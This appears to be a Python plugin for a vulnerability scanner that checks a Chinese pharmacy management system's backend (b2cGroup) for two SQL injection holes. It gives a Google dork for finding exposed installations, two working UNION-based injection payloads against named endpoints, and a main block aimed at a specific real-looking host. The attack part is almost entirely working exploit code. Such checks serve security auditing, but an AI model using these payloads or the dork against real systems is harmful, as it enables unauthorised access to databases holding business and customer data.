#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 珍诚药店管理系统后台两处SQL注入
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2015-0124399
description:
    google dork: powered by b2cGroup

    getProductQualification.do?productCode=1000100887
    managerProductDetail.do?productid=9950004
    getProductImgs.do?productCode=10050001&productId=9950001
'''

import time

def assign(service, arg):
    if service == 'b2cgroup':
        return True, arg

def audit(arg):
    payloads = [
            arg + 'getProductQualification.do?productCode=1000100887%27%20union%20all%20select%20NULL,%20NULL,%20NULL,%20NULL,%20CHR(58)||CHR(112)||CHR(119)||CHR(116)||CHR(102),NULL%20FROM%20DUAL--',
            arg + 'managerProductDetail.do?productid=9950004)%20union%20all%20select%20CHR(58)||CHR(112)||CHR(119)||CHR(116)||CHR(102),NULL%20FROM%20DUAL--',
        ]
    for payload in payloads:
        code, head, res, err, _ = curl.curl2(payload)
        if(code == 200) and (':pwtf' in res):
            security_hole("SQL injection: " + payload)
    
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('b2cgroup', 'http://admin.yizheng.cc/')[1])